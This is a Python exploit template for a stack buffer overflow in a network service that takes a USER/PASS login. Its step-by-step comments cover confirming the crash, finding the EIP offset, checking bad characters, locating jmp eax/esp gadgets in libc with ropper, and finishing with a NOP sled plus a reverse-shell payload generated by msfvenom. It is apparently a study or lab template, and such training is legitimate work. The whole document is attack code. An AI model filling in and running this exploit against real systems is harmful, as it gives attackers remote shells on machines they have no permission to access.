#!/usr/bin/python3

import socket
import sys
import subprocess

TARGET = "xx.xx.xx.xx"
PORT = 0
PATH = '' # if required

CRASH_LEN = 0
OVERFLOW_LEN = 0
EIP = ''
LIBC = ''
# JMP_EAX = ''
# JMP_ESP = ''
NOP_SLED = "\x90" * 32

send = lambda s,cmd,payload : s.send((cmd + payload + '\r\n'))
# run_proc = lambda cmd_list : str(subprocess.check_output(cmd_list)).strip()

# 1. Confirm crash 
payload = "A" * CRASH_LEN

# 2. Create pattern and get offset/OVERFLOW_LEN
# payload = subprocess.check_output(['python3', 'pattern.py', '-l', str(CRASH_LEN)])

# 3. Confirm EIP Overwrite
# payload = "A" * OVERFLOW_LEN + "B" * 4 + "C" * (CRASH_LEN - OVERFLOW_LEN - 4)

# 4. Confirm bad characters
# > Examin estack with gdb:
# x/100x $esp-$OVERFLOW_LEN
# bad_chars = subprocess.check_output(['python3', 'bad_chars.py'])
# payload = "A" * OVERFLOW_LEN + "B" * 4 + bad_chars + "C" * (CRASH_LEN - OVERFLOW_LEN - 4 - len(bad_chars))

# 5.1. Get JMP_EAX
# > Good if not enough space after ESP
# > Run program in GDB
# > Command: 'vmmap' and:
# > 1. Get filepath of libc
# > 2. Copy first address (base address of libc)
# > Copy libc to current directory
# LIBC = $base_address
# > Get jump eax from libc
# $ ropper
# (ropper)> file libc-2.31.so
# (libc-2.31.so/ELF/x86)> search /1/ jmp eax
# > Get offset of jmp eax
# EIP = LIBC + JMP_EAX
###### OR
#
# 5.2. Get JMP_ESP
# $ ropper
# (ropper)> file libc-2.31.so
# (libc-2.31.so/ELF/x86)> search /1/ jmp esp
# > Get offset of jmp eax
# EIP = LIBC + JMP_EAX
#

# 4. Confirm EIP redirection
# payload = "A" * OVERFLOW_LEN + EIP + "C" * (CRASH_LEN - OVERFLOW_LEN - len(EIP))

# --- Final ---
# EXAMPLE: msfvenom -p $os/shell_reverse_tcp LHOST=xx.xx.xx.xx LPORT=1337 EXITFUNC=thread -b "\x00\x0a\x0d\xff" -f c -a x86
# payload =  ()
# junk =  "C" * (CRASH_LEN - OVERFLOW_LEN - len(EIP) - len(payload) - len(NOP_SLED))
# payload = "A" * OVERFLOW_LEN + EIP + NOP_SLED + payload + junk

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    s.connect((TARGET, PORT))
    s.recv(1024)
    send(s, 'USER', 'test')
    s.recv(1024)
    send(s, 'PASS ', payload)
    s.recv(1024)
    send(s, 'QUIT', '')
    s.close()
except Exception as e:
    print(f"DEBUG INFO: {e}")
    sys.exit()